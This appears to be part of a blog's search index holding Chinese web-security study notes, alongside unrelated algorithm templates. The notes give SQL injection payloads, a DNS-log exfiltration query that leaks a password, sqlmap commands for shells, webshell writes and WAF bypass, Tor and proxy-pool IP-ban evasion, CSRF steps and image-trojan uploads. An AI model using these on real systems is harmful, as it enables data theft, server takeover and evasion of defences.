参考资料","link":"/2022/04/18/%E6%A8%A1%E6%9D%BF/"},{"title":"sql注入和sqlmap","text":"摘要：本文介绍了sql注入的原理和常用的开源自动化sql注入工具–sqlmap 前言sql注入是最常用的注入手段，被称为漏洞之王，是学习web安全不可或缺的。 一.sql注入原理1.什么是sql注入什么是注入？一句话定义：把用户输入的数据当做代码执行 sql注入；用户在网页输入的内容被浏览器当做数据库语句进行执行。 原因是服务端在接收来自客户端的查询参数后，未对查询参数进行严格的过滤。导致恶意用户可在查询参数中插入恶意的sql语句来查询数据库中的敏感信息，最终造成数据库信息泄露。这也是安全防护的方法 关键点：我们输入的内容一定要是数据库语句。 我们输入的地方有哪些: 121.网站给我们提供的框框（比如搜索框）2.网址的参数的值的地方。 2.mysql常用语法mysql和sql server都是最常用的数据库语言，虽然语法不同但特别相似。其中mysql是开源的，sql server是微软开发的。 12345库：information_schema 是Mysql数据库里面一个自带的库的库名，存储着你所有的数据库名、表名和列名。表：schemata,tables，columns;schemata存库名，tables存放都是表名，columns都是列名列：table_name(存储的表名)， table_schema（存储的是库名），column_name（存储的是列名）limit m,n # 查询m+1行的n条数据。 m+1行开始查询多少条？如limit 0,1group_concat #多行数据用一行显示 大概的demo长这样： 3.其他类型判断注入漏洞 我们发现在这里url显示id=1但实际上id=’1’,多了引号，如果还像上面那样用and 1=2判断就会变成id=’1 and 1=2’，即输入的内容会被包括在引号里。我们想到在1后面加个引号，再加上and 1=2，此时会变成 此时只需注释掉最后一个引号即可。mysql的两种注释： 12-- abc #abc不会被识别，注意--后有空格，但打空格会被自动取消掉，可以打空格的unicode编码%20或+#abc #注意不能打#,要打#的unicode编码%23 4.get注入与post注入数据包的第一行的第一个是请求方式GET或POST 以上在URL中传递参数为GET注入在网址需要转换成unicode；如果是在网页的框内，为POST注入,应该不转换。万能密码：猜测源代码中有’要形成闭合，#意味注释掉后续代码，因为1=1为真，所以代码执行后为真，通过 123数字型判断：and 1=1 / and 1=2字符型判断：' and 1=1 -- '搜索型判断：and %' -- q id='%abc%' 怎么知道是什么类型的？暴力枚举–有类似万能密码字典的东西。 二、注入分类1.显错注入/联合注入（Mysql数据库）的基本流程12345678910111213141516171819202122 1.判断网站是否存在数据库注入漏洞 and 1=1 网页有内容 and 1=2 网页没有内容 ==&gt; 这个网站存在数据库注入漏洞。原因：我们输入的数据库语句被网站代入到他的数据库中执行了。 2.判断字段（列）数， order by ，作用是排序。 order by 1 --&gt; 页面有内容，说明网站的那个表有1列 order by 2 --&gt; 页面有内容，说明网站的那个表有2列 order by 3 --&gt; 页面没有内容，说明网站的那个表没有3列，--&gt; 只有2列。3.查看回显点： union ，作用是联合查询，能够同时执行两条数据库查询语句。 注意：必须保证两条数据库查询语句查询的表的列数一致。这也是步骤2的必要性。回显点的作用：在该处输入的任何数据库语句，都会被直接执行，并且显示到页面上！如修改select 1,2中的2，页面内容发生变化，则第二列为回显点。4.查询相关内容 and 1=2 union select 1,2 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 and 1=2 union select 1,password from admin limit 0,1 # hellohack 用到的函数： 12version() ，# 作用 ：查询版本 ， 如5.5.53database() # 作用：查询当前数据库的库名 2.盲注(1)布尔注入盲注和显错注入的区别就是没有回显点。即我们要通过判断的方式，去查询相关数据内容用到的函数： 1234567length(database()) # 查询的是【当前数据库库名】的长度。length(database())=2 --&gt; 无查询数据 --&gt; 当前数据库的库名不是2个字符substr(字符串,m,n) # 函数，作用是截取。substr('cmd',1,1) # --&gt; 截取的是 c substr(database(),1,1) # 截取【当前数据库库名】的第一个字符。and substr(database(),1,1)='a' --&gt; 页面无内容--&gt; 说明当前数据库库名第一个字符不是a 1and substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) = 'a' --&gt; 第一个字符不是a (2)时间注入以上均为布尔盲注，还有一种时间盲注，需用到sleep(),这个函数能让网页延迟显示 12and sleep(5) # 网站延时了5秒再显示。if(length(database())=12,sleep(5),1) --&gt; 网站延迟显示5秒，说明判断条件是对的--&gt;当前数据库库明的长度是12 可见，盲注很费时间。由此诞生了专门针对数据库注入漏洞的sqlmap工具。 3.cookie注入在Cookie处进行注入。 当你使用Cookie进行传参的时候 ，传参的值一定要进行URL编码的。默认浏览器是会URL编码的。 空格–&gt; %20 如果用的数据库是ACCESS，语法比较正规(select后一定要有from即要先找到一个表名)b9a2a2b5dffb918c -&gt; md5解码-&gt; welcome 12escape() # 函数，作用：进行URL编码document.cookie = &quot;id=&quot; + escape(&quot;171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin&quot;) 4.head注入HEAD注入条件是知道用户名密码或登录状态 网络中web访问是以IP数据包形式传输数据，每个数据包由头部（head）和数据体（body）组成，head中有访问者的各种信息。 有的网站他会为了保存我们的信息作为比对会把head头中的信息保存到数据库中以便下一次使用。通讯时我们若能抓到请求数据包，并将头部中身份信息修改则为HEAD注入。抓包实例如下（使用burp） 就像图中User-Agent本意是表示你是哪种访问方式例如苹果、微软、安卓、华为等等，图中我把他的值更换为了一个注入语句，并报错就返回了我关心的结果。 12updataxml或extractvalue #报错函数 head注入是通过引起报错，来返回需要的信息，所以不需要回显点concat 下面详细讲解UPDATEXML (XML_document, XPath_string, new_value); 1234第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)&lt;--有特定要求格式第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变XML_document文档中符合XPATH_string的值 注入语句为 1updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误ERROR 1105 (HY000): XPATH syntax error: '得到的数据' 5.报错注入任何能引起数据库报错的输入，如引号 123试下' and 1=1111,看报错信息'aandnd updatexml(1,concat(0x21,@@version,0x21),1)-- q#能让数据伴随报错一起显示0x21-&gt;!的编码 能让我们更快地识别出信息 6.DNS_LOG注入组合工具。利用DNS解析然后配合日志记录，将数据库里面的数据拿出来。 特点：能够将盲注变成显错注入。oob： out of bind 数据外带。 （1）什么是DNS把域名转换成IP地址的协议。域名-&gt;IP的外号 123域名 ip地址qq.com 12.34.56.78taobao.com 34.55.88.99 123a、网站搭建在服务器上b、服务器就是电脑c、访问网站的本质：浏览互联网上某台电脑上的某个文件 例如，修改host文件(本地DNS服务器)，我们输入完http://www.chenchan.com这个域名之后，咱们电脑会先访问host文件，就会将www.chenchan.com解析成192.168.189.128，然后访问这个IP。 （2）子域名和DNS日志记录DNS解析记录的日志网站,作用：可以申请一个域名，然后会记录下任何访问了这个域名和子域名的IP 12fefaad.dnslog.cn 都有记录。database.fefaad.dnslog.cn 也有记录 (3)注入方法关键函数： 123load_file() # 作用是：读文件concat() # 作用是 拼接字符串select load_file() #读取文件内容 命令： 12select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))select load_file(concat('//',(select password from admin limit 0,1),'.qtm0xb.dnslog.cn/1.txt')) 如图，发现没有回显点后，先输入and (),要执行括号里的语句:select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))注意一定要带一个文件，文件是什么无所谓，但loadfile是读取文件的，必须在mysql命令里写一个文件名上去。 三、BurpSuite什么是BurpSuite原理：中间人原理(如0元支付漏洞) 特点： 12所有模块可共享一个数据请求能测试网站所有的漏洞 安装和配置kali自带的是免费的社区版，功能有限，我们自己安装专业版 选择manual activation，然后无脑下一步 字体设置：user option -display 浏览器代理设置：burp依赖于浏览器代理。安装SwitchyOmega插件即可，该插件作用是智能化设置浏览器代理。 记得把插件设置成proxy模式 安装证书：burp默认只能访问http，要访问https的话需要安装CA证书。在burp的proxy模块–options–import/export CA–选择export的certificate in DER format–导出证书的位置(如桌面，保存为1.cer) 然后把证书导入到浏览器里，设置里搜索证书，导入1.cer即可 常用模块Target:容易探测越权类漏洞黑体代表访问过的站点，灰体代表没访问过但黑体站点包含的站点。scope可以设置查看网站的范围。 123通常配合spider(爬虫)、scanner(扫描web漏洞)模块使用。spider:将目标网站所有的网页让工具走一遍，然后配合filter找出有参数的页面scanner:AWVS,appscan,X-ray做的比burp好 proxy:burp的核心作用–抓数据包改包数据包分为请求数据包和响应数据包 12输入url,回车 --请求回车后，出现网页内容 --响应 浏览器拿到响应后渲染出页面 HTTP history可查看请求和响应option可改监听的端口(默认是8080，如果改成8081则浏览器也要改成8081)，还可以移除需要的验证(如javascript);显示隐藏内容;自动匹配与替换请求包的内容 repeater：手动探测漏洞比如proxy模块抓包后转发到repeater模块(体现了所有模块可共享数据请求)，可以直接查看响应内容。 intruder：爆破爆破是一种常见思想。 123position --设置爆破位置,默认会帮我们设，可以clear掉payloads --设置爆破字典option --可改爆破速度(number of threads,如50) 根据响应长度来判断(和大多数不一样) 宏：自动化设置数据 有验证码不能重复？配合其他工具使用 extender：安装插件CO2:与sqlmap结合，需配置sqlmap位置如下 jython.jar:让burp能使用python写的插件burpJSlinkFinder:能快速发现权限方面的漏洞，需pythonburpFaKeip:可以伪造ip和随机ip爆破 四、sqlmapSqlmap 是一个开源的渗透测试工具，可以自动检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 官网。注意：kali自带sqlmap工具。特点： 123全面支持各种常用的数据库语言全面支持六种SQL注入技术：布尔、时间、错误、联合、堆叠、oobsqlmap偏向于跑盲注 用法： 1234sqlmap -u &quot;url&quot; #kali用法sqlmap -u &quot;?id=1&amp;wd=123&quot; -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-usqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包sqlmap -r 1.txt --data=&quot;wd=123,id=1&quot; #确定参数，可以跟-u和-r 当发现网站确实存在漏洞，就可以找数据了 12345678--dbs #查询所有数据库的库名-D 指定数据库--tables #查看所有的表-T 指定表名--columns #查询所有的列名-C 指定列名 如-D maoshe -T admin -C password --dump--dump ：查看数据(保存：-s “xx.log” 恢复:-s “xx.log” --resume) 进阶命令： 123456789--os-shell#执行系统命令,会让你选择目标网站服务器语言 sqlmap.py -u &quot;&quot; --os-shell --batch #默认选择 sqlmap.py -u &quot;&quot; --os-shell --batch--file-write=&quot;yjh_muma.php&quot; --file-dest=&quot;C:/phpStudy/WWW/502g58de/xiaoma.php&quot; #写文件到目标位置(木马)--proxy #使用代理去扫描目标 sqlmap.py -u &quot;&quot; --proxy=&quot;http://127.0.0.1:8080/&quot;（代理软件占用的端口在8087)--random-agent #使用随机的User-Agent头 绕过网站检测(默认user-agent会有sqlmap字段)--cookie #使用用户身份 sqlmap -u &quot;&quot; --cookie=&quot;cookie内容&quot;--level #提高扫描强度(默认不大)，扫描出漏洞可能性变大，但扫描时间会变长--risk #风险等级的设定 --level 3 --risk 2(经验值)--tamper：使用绕WAF的脚本 --tamper=&quot;tamper/between.py,tamper/randomcase.py&quot; 总结学习了sql注入的原理和sqlmap的使用方法。 问题1.sqlmap 连接超时12345看注入的目标地址是不是 https 协议，如果是可以使用sqlmap直接加上–force-ssl参数，告诉sqlmap这是https服务。或者可以在Host头后面加上:443（默认不是443）。ip 被封，需要开启代理，时刻切换ip，避免封ip梯子：智能模式访问国内网站仍用正常ip，全局梯子则是所有网站都会改变ip 参考资料1.sqlmap中文文档 2.靶场跑不了爆破临时解决办法 3.代理和VPN有什么区别","link":"/2022/04/10/sql%E6%B3%A8%E5%85%A5%E5%92%8Csqlmap/"},{"title":"acwing 1.基础算法","text":"摘要：acwing算法基础课学习笔记 零、如何学123主要思想 &lt;-- 上课理解并背过代码模板 &lt;--快速默写并调试通过题目 &lt;--提高熟练度(写完删掉重写一遍，重复3-5遍) 一、基础算法（一）排序快速排序 –基于分治123确定分界点x：q(l),q(r),q((l+r)/2),随机调整区间：保证左边的数&lt;=x,右边&gt;=x递归处理左右两边 难点是如何调整区间 1234#暴力做法开两个数组a[],b[]遍历q[l~r],若&lt;=x,插到a;若&gt;x，插到ba[]-&gt;q[],b[]-&gt;q[] 1234567#优美做法(双指针)创建两个指针L,R(也可用序号表示)L一直向右移，直到找到一个&gt;x的数，停下R一直向左移，直到找到一个&lt;=x的数，停下#此时L指向的数应放到右边，R指向的数应放到左边swap L，R对应的数，此时L指向的就是&lt;=x的，R指向的是&gt;=x的重复直至L,R相遇 怎么判断递归的序号起止？ 1234j停留的位置一定不满足&gt;x,即q[j]&lt;=xi停留的位置一定不满足&lt;x,即q[i]&gt;=xsort(q,l,j) //sort(q,l,i-1)sort(q,j+1,r) //sort(q,i,r) 注意边界问题： 12345若递归选择i，则分界点不能是q[l];j同理不能是q[r]中间点q[(l+r+1)/2]是万能的,建议选中点，也不容易超时如样例：n=2,q=[1,2]第一次递归时i=j=0,sort(q,0,-1),sort(q,0,1);会无限循环sort(q,0,1) 快排模板如下： 12345678910111213void quick_sort(int q[], int l, int r){ if (l &gt;= r) return; int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while (i &lt; j) { do i ++ ; while (q[i] &lt; x); do j -- ; while (q[j] &gt; x); if (i &lt; j) swap(q[i], q[j]); } quick_sort(q, l, j), quick_sort(q, j + 1, r);} 注意：分界点不一定=x 变形：第k个数 k每次更新成新区间第k小的数，所以每次新区间要重新编号 时间复杂度O(2n) 归并排序 –分治快排是先排后递归，归并是先递归再排 123确定分界点：mid = (l+r)/2递归排序left,right把两个有序的数组合成一个(难点) &lt;--双指针 (合并链表也是同样的原理) 如果两个值相同，一般是把第一个序列的指针往后移动一位（归并排序是稳定的） 归并模板如下： 123456789101112131415161718void merge_sort(int q[], int l, int r){ if (l &gt;= r) return; int mid = l + r &gt;&gt; 1; merge_sort(q, l, mid); merge_sort(q, mid + 1, r); int k = 0, i = l, j = mid + 1; while (i &lt;= mid &amp;&amp; j &lt;= r) if (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ]; else tmp[k ++ ] = q[j ++ ]; while (i &lt;= mid) tmp[k ++ ] = q[i ++ ]; while (j &lt;= r) tmp[k ++ ] = q[j ++ ]; for (i = l, j = 0; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];} 二分整数二分只要看到有序序列，一定想到二分，或先排序后二分。每次保证更新的闭区间里一定有答案。 为什么第一种模板mid有一个+1？ 如果mid=(l+r)/2，如果某次划分的二分区间是[l,r]且l=r-1，则mid=下取整(l+r)/2=l,若check判断为true的话，则更新的区间仍为[l,r],即无限循环 12mid=l+r&gt;&gt;1check(mid) 模板如下 123456789101112131415161718192021222324bool check(int x) {/* ... */} // 检查x是否满足某种性质// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：int bsearch_1(int l, int r){ while (l &lt; r) { int mid = l + r &gt;&gt; 1; if (check(mid)) r = mid; // check()判断mid是否满足性质 else l = mid + 1; } return l;}// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：int bsearch_2(int l, int r){ while (l &lt; r) { int mid = l + r + 1 &gt;&gt; 1; if (check(mid)) l = mid; else r = mid - 1; } return l;} 二分法一定有解，题目可能无解，无解时，返回值的含义是第一个满足条件的。 浮点数二分保留六位小数 1r-l&gt;=1e-8 //经验值是保留的位数+2，若不满足要求可进一步提高精度 注意浮点数一定是严格按照[l,mid],[mid,r]来分的因为没有mid+1或mid-1，所以mid=(l+r)/2，不必再考虑+1的问题 浮点数模板如下： 12345678910111213bool check(double x) {/* ... */} // 检查x是否满足某种性质double bsearch_3(double l, double r){ const double eps = 1e-6; // eps 表示精度，取决于题目对精度的要求 while (r - l &gt; eps) { double mid = (l + r) / 2; if (check(mid)) r = mid; else l = mid; } return l;} 二、基础算法（二）1.高精度(1)高精度加法四种类型： 1234A+B len(A)&lt;=1e7A-B A*a a&lt;=1e10A/a 大整数的存储：低位在数组左边，高位在数组末尾原因；加法进位要补位数，在数组末尾补比数组头部补容易(要整个数组往后移动一位)模板： 123456789101112131415161718// C = A + B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; add(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B){ if (A.size() &lt; B.size()) return add(B, A); vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size(); i ++ ) { t += A[i]; if (i &lt; B.size()) t += B[i]; C.push_back(t % 10); t /= 10; } if (t) C.push_back(t); return C;} (2)高精度减法 模板： 12345678910111213141516// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0vector&lt;int&gt; sub(vector&lt;int&gt; &amp;A, vector&lt;int&gt; &amp;B){ vector&lt;int&gt; C; for (int i = 0, t = 0; i &lt; A.size(); i ++ ) { t = A[i] - t; if (i &lt; B.size()) t -= B[i]; C.push_back((t + 10) % 10); if (t &lt; 0) t = 1; else t = 0; } while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} (3)高精度乘法到下一位时，权重少10倍 模板： 123456789101112131415161718// C = A * b, A &gt;= 0, b &gt;= 0vector&lt;int&gt; mul(vector&lt;int&gt; &amp;A, int b){ vector&lt;int&gt; C; int t = 0; for (int i = 0; i &lt; A.size() || t; i ++ ) { if (i &lt; A.size()) t += A[i] * b; C.push_back(t % 10); t /= 10; } while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} (4)高精度除法 模板： 123456789101112131415// A / b = C ... r, A &gt;= 0, b &gt; 0vector&lt;int&gt; div(vector&lt;int&gt; &amp;A, int b, int &amp;r){ vector&lt;int&gt; C; r = 0; for (int i = A.size() - 1; i &gt;= 0; i -- ) { r = r * 10 + A[i]; C.push_back(r / b); r %= b; } reverse(C.begin(), C.end()); while (C.size() &gt; 1 &amp;&amp; C.back() == 0) C.pop_back(); return C;} 2、前缀和数组(1)一维定义$S_N = a_1+a_2+…+a_N,S_0=0$,如果已经算出来了S,则[l,r]区间的a数组和为$S_r-S_{l-1}$,时间复杂度为O(1)模板： 12345678910111213const int N =1e6+10;int a[N],S[N];int n,m,l,r;int main(){ scanf(&quot;%d%d&quot;,&amp;n,&amp;m); for(int i = 1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;a[i]); for(int i = 1;i&lt;=n;i++)S[i]=S[i-1]+a[i]; while(m--){ scanf(&quot;%d%d&quot;,&amp;l,&amp;r); printf(&quot;%d\\n&quot;,S[r]-S[l-1]); } return 0;} (2)二维3.差分(1)一维差分是前缀的逆运算 构造：初始化${a_n},{b_n}$为0，看做n次插入，每次插入$a_n$,插入时可看做[n,n]区间加上$c = a_n$,所以不需要考虑构造的问题。即先构造${b_n}$,再根据${b_n}$写出${a_n}$ 复杂度：每次+c从O(n)–&gt;O(1) (2)二维a[i][j]存放差分数组b[i][j]所有左上角的和 $b_{x1,y1}+=c,则该点所有右下角的a都会+c$ 总结这节课学了排序(包括快排、归并)和二分(整数、浮点数)的模板 参考资料： 1.acwing","link":"/2022/04/14/acwing%201.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"},{"title":"CSRF漏洞","text":"摘要：本文介绍了CSRF漏洞的定义和攻击方法 前言 一.什么是CSRFCSRF(Cross-site request forgery,跨站请求伪造),是一种挟制用户在当前【已登录】的 【Web 应用程序】上执行【非本意】的操作 的攻击方法。即目标修改了攻击者的修改 123XSS的攻击，是利用用户对网站的信任。CSRF攻击：利用网站对用户的信任。xsrf = xss + csrf 123正常网站A，我们有一个转账的操作，危险网站B，它能够利用我们的cookie去完成转账的操作，前提：我们必须访问这个危险网站B。例如：攻击者，保存了【提交公告】的操作，受害者登录了后台，同时也访问了另外一个危险网站，这个危险网站会利用POC和cookie执行【提交公告】这个操作 注意,目标先访问A，后访问B；且保存的这个操作必须是同个网站的，比如说想让管理员创建一个用户，但是普通用户是访问不了创建用户的界面的，无法生成POC，就不能这样攻击。且不是所有网站都有CSRF 我们通过一些技术手段欺骗受害者的浏览器去访问一个登录过的网站并执行一些操 作。由于浏览器曾经认证过，所以被访问的网站 会认为是真正的用户操作而去执行。 二、csrf 验证步骤(比如用扫描器扫描到了CSRF漏洞)1234step1:注册两个账号（临时邮箱，接码平台）如：test-1 和 test-2step2：test-2 修改信息，抓包，生成poc(burp)step3:test-2退出账号，登录test-1。test-1访问生成的poc 三、CSRF自点击技巧12id='a'是干啥呀 # 相当于给form取了个名字setTimeout() # 定时器，每隔多少执行一个操作 四、生成方法burp记录这个操作的时候，都是HTML语言 —&gt; 是CSRF攻击的一种生成方法 现在生成csrf攻击的另外一种——JS语言 总结 参考资料","link":"/2022/04/18/CSRF%E6%BC%8F%E6%B4%9E/"},{"title":"msf框架","text":"摘要：本文介绍了metasploit框架 前言 一.安装和配置必要依赖Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数千个已知软件漏洞的专业级漏洞攻击工具。 12Exploits -- 一句话trojan，获取一定的控制权限Payload --权限持久化 总结 参考资料","link":"/2022/04/18/msf%E6%A1%86%E6%9E%B6/"},{"title":"sql注入控制目标服务器","text":"摘要：本文完成了sql注入控制目标服务器的实战项目 前言实战项目：用sql注入控制目标服务器 一.必备知识sql注入 sql注入与trojan12select ··· into outfile ···· # 将查询的内容写入数据库的文件(可新增)Eg：select 'woaini Eleven' into outfile 'c:/WWW/AAAAA.txt' waf:会过滤and、or、=等关键词,如双写绕WAFand --&gt; aandnd 二、实战思路12345678910111213141516171819201.判断网站的应用方向电商类：业务逻辑漏洞，主要针对网站一些功能点门户类：信息泄露出来的漏洞，综合类的论坛类：站点层的漏洞2.了解网站技术架构java、中间件...3.CMS识别有的话--&gt; 找漏洞复现没有的话 --&gt; 黑盒测试（信息收集+漏洞种类）细节：(burp-repeater快速看response)不改变验证码情况下，网站依然对我们输入的密码做出了判断 --验证码可重复利用漏洞 --&gt;任意用户注册在任何平台提交漏洞，看的不是种类，而是漏洞危害信息收集， 你找到了1个站，你掌握了5个漏洞，你有机会测试5个地方。 你找到了n个站，你掌握了5个漏洞，你有机会测试n*5个地方。信息收集 --&gt; 扩大攻击面漏洞种类 --&gt; 扩大攻击点敏感文件是什么？源码、压缩包、密码文件、 总结 参考资料","link":"/2022/04/17/sql%E6%B3%A8%E5%85%A5%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"sqlmap与ip黑名单绕过","text":"摘要：本文提出了两种sqlmap绕过ip黑名单的方法。分别是基于github上的ProxyPool项目搭建自己的免费代理池，和基于tor实现ip实时变化。 前言做靶场的sql注入时因访问频率过高被禁ip,就想实现一个不停变换ip的sqlmap。一开始想到用代理，结果在配置时踩了无数坑，且免费代理的效果和安全性也不太好，转而用tor。 一、基于proxypool搭建代理池1.安装和配置必要依赖(1)redis服务Redis是由C语言编写的开源、基于内存、支持多种数据结构、高性能的Key-Value数据库。 安装redis 123456wget https://download.redis.io/releases/redis-6.2.6.tar.gz //2022.4 最新tar xzf redis-6.2.6.tar.gzmv redis-6.2.6 /usr/local/rediscd /usr/local/redismakemake install PREFIX=/usr/local/redis 安装完成的提示 启动redis 1234567vim /bin/redis.conf //需在redis安装目录执行,将该配置文件中的daemonize no改为daemonize yes,来redis以后台方式运行./bin/redis-server redis.confps -ef | grep redis//查看redis进程./bin/redis-cliset test helloget test//测试exit (2)proxypoolgithub上的15k stars项目proxypool，主要功能为定时采集网上发布的免费代理验证入库，定时验证入库的代理保证代理的可用性，提供API和CLI两种使用方式。 1234567git clone https://github.com/jhao104/proxy_pool.gitpip install -r requirements.txt更新配置setting.py(主要是改API的PORT和数据库)。如：PORT = 5010 # 监听端口DB_CONN = 'redis://:pwd@127.0.0.1:8888/0'python proxyPool.py schedule # 启动调度程序python proxyPool.py server # 启动webApi服务 执行proxypool项目的调度程序和webApi服务程序(调度程序执行到base.py就可退出，但webApi需一直执行才能访问api网站)，然后访问setting里的127.0.0.1:PORT,(PORT为setting中设置的值，如默认的5010)，然后会提示访问不同文件的功能，如访问http://127.0.0.1:5010/get是获得一个代理地址。如下 如图，我们发现它的响应有很多属性，甚至还保留了属性名，而要使用sqlmap的–proxy代理功能需要网站只返回一个代理的地址实现方法是把127.0.0.1:5010/all里的所有代理ip采集下来并存在ips.txt中,再转发至127.0.0.1的一个端口IPSPORT，然后设置代理=127.0.0.1:IPSPORT 把/all里的ip采集到ips.txt并通过亚马逊ip验证 123456789101112131415161718192021import requestsdef get_proxy(): return requests.get(&quot;http://127.0.0.1:5010/all&quot;).json()res = requests.get(&quot;http://127.0.0.1:5010/count&quot;).json()count = res[&quot;count&quot;][&quot;total&quot;]print(&quot;目前代理池中共计：%s个代理.&quot; % count)f = open(&quot;ips.txt&quot;, &quot;w&quot;)ipall = get_proxy()#注意不能在for里面用这个函数，否则会list越界(count变化)for i in range(count): b = ipall[i][&quot;proxy&quot;] try: requests.get('http://checkip.amazonaws.com/', proxies={&quot;http&quot;: &quot;http://{}&quot;.format(b)},timeout=0.5)#需要快速响应的ip print(i) f.write(b + &quot;\\n&quot;) except Exception: passf.close() autoproxy需修改下except，代理为http://127.0.0.1:50007。只要ip池足够大，连接失败会自动切换可用ip 12345print(a) except Exception: local_server.close() logger.debug('Stop mapping service.') break 二、基于tor实现sqlmap或浏览器ip实时变化1.基于tor browser(1)安装tor browser安装tor browser解压包，进入解压后的目录 tor-browser_en-US 中打开 Browser 文件夹，找到 start-tor-browser 文件，编辑文件，将图中的0改为1，然后保存，目的是能用root用户使用tor(tor不推荐用root权限使用) 然后退出 Browser 文件夹选择 start-tor-browser.desktop 点击运行会出现如下界面，在配置中输入梯子的HTTP地址和端口 连接 Tor 服务器成功,即可使用 (2)配置proxychainkali自带proxychain4,可配置tor代理命令的地址和端口 先查看 Tor 在主机上的服务端口，如图默认是9150(注意保持tor浏览器打开) locate proxychains.conf查找 proxychains.conf位置,修改 proxychains.conf 文件,然后用proxychains curl ipconfig.me测试是否代理成功 (3)修改tor browser配置tor浏览器除了第一次访问某网站会分配给你一个和主机不同的ip，好像是默认10分钟换一次ip的。不能满足我们sqlmap的需求，可以在Browser/TorBrowser/Data/Tor/修改torrc配置文件，只需加上一行 1MaxCircuitDirtiness 1 可以改成每1分钟换一次ip 2.基于tor和ipchanger(1)安装dockerDocker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口 12345678curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -echo 'deb https://download.docker.com/linux/debian stretch stable'&gt; /etc/apt/sources.list.d/docker.listapt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-commonapt-get update sudo apt install docker.io #安装dockerdocker -v #检查是否安装成功apt install docker-compose #安装docker compose输入docker-compose,显示可用命令，则安装成功 (2)安装tor终端输入tor按照提示下载即可，下载完再次输入tor，显示正在建立链接(需梯子)，其默认端口为9050(查看方法同上)。 如果要配置tor代理的话同上，不配置也可用SOCKS5代理直接用 (3)安装ipchangeripchanger通过使用 TOR服务端每隔10秒请求一次新身份，可实现10秒换1次ip Linux只能用docker安装，安装方法 1234567把整个项目下载下来,解压到ipchanger文件夹进入Dockerfile同级目录docker build . -t ipchangerxhost +docker run -p 14999:14999 -p 9050:9050 -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix ipchanger然后就先start tor server(可以不开tor，但要梯)start IP change 默认代理端口为9150，可通过proxychain查看tor服务获得 三、sqlmap绕过ip黑名单用sqlmap扫描目标网址总是被封，该怎么利用以上方法呢？ 123sqlmap -u &quot;&quot; –-proxy= http://127.0.0.1:5000sqlmap -u &quot;&quot; --proxy= socks5://127.0.0.1:9150sqlmap -u &quot;&quot; --tor -tor-type=SOCKS5 使用之前先检测一下代理是否会变化 遇到的问题OSError: [Errno 98] Address already in use 错误是指端口被占用，未释放或者程序没有正常结束 12lsof -i:端口号 #可通过端口号来查找进程IDkill -9 pid #pid是指进程的ID号 ，kill -9 用来强制杀死进程 总结免费代理还是比较少的，而且匿名性也不好，有条件还是得用付费代理。 参考资料 Linux上安装Redis教程 ProxyPool文档 SqlMap代理池 Sqlmap自动切换代理 luminati代理快速使用教程 如何配置 Tor 代理池以及实现Sqlmap渗透注入防封IP测试 kali安装docker（亲测有效） dockerfile菜鸟教程 sqlmap笔记","link":"/2022/04/16/sqlmap%E4%B8%8Eip%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"},{"title":"trojan控制服务器","text":"摘要：本文介绍了trojan,和常用的trojan工具 前言 一.必备知识文件上传漏洞：用户通过上传trojan文件，获得了管理网站/服务器的权限关键点：网站必须提供上传功能，知道trojan上传路径，trojan能被执行trojan:伪装成正常程序的恶意程序，一旦运行可以控制电脑网页trojan:伪装成正常网页的恶意网页(如x.php)，一旦运行可以控制网站或服务器webshell:一个文件，后缀名是asp,php,aspx等，功能是管理网站小马：功能少，代码量小的trojan大马：功能多，代码量大的trojan通信过程： 123451.输入网址2.浏览器把网址发送给DNS服务器并解析出ip3.浏览器拿到ip后，向那个ip服务器发起HTTP协议4.服务器会得到浏览器请求，并做出响应5.浏览器拿到响应，生成页面 二、制作图片trojan一般网站都不允许上传asp,php,aspx等后缀的文件，所以我们要改成图片的格式 1copy 原有图片.jpg/b + trojan.asp 要新生成的图片马.jpg 中间件(Nginx,Apache,Tomcat,IIS)：提供网站服务，并能解析webshell IIS6.0漏洞:后缀名为cer,cdx,asa的文件，统一解析成asp。比如上传了1.cer，最后执行的名字是1.asp。所以把图片马的后缀改成cer Apache解析php,Tomcat解析java 为什么不直接把ASP文件后缀名改成cer：每个文件都是有特征的 如何收集网站的中间件信息：Wappalyzer插件 三、找路径四、管理webshell管理webshell的工具：菜刀、蚁剑、冰蝎、格斯兰(kali默认安装了weevely,在命令行执行即可) 